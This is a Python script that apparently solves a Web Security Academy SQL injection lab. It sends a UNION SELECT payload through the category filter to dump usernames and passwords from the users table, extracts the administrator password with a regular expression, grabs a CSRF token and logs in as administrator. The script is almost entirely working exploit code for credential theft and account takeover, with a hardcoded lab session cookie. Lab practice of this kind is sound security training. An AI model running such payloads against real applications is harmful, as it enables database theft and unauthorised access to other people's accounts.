# SQL injection UNION attack, retrieving multiple values in a single column

import requests
import re

url = "https://0a96004a0361207fc0e2472d00930078.web-security-academy.net/"

# find the admin password with SQL injection
PAYLOAD = "' UNION SELECT NULL,username||'~'||password from users -- -"

cookies = dict(session="8uTEEagsfKYML3eCoyFc7IniZMlsDDPn")
params = dict(category=PAYLOAD)
session = requests.Session()

r = session.get(url + 'filter', params=params, cookies=cookies)
pwd = re.findall(r'administrator~(.*)</th>', r.text)

# Get the CSRF token
r2 = session.get(url + 'login', cookies=cookies)
csrf = re.findall(r'csrf" value="(.*)">', r2.text)

# Login as administrator account
data = {
	"username": "administrator",
	"password": pwd[0],
	"csrf": csrf
}
session.post(url + 'login', data=data, cookies=cookies)
